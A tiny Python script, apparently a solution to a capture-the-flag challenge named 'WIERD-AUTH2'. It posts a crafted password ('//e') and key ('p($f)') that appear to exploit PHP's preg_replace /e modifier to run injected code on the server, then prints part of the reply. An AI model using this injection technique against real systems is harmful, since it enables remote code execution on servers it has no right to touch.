import requests
import sys

r = requests.post("http://hack.bckdr.in/WIERD-AUTH2/submit.php", data={'password': '//e', 'key': 'p($f)'})
sys.stdout.write(r.text[:75])
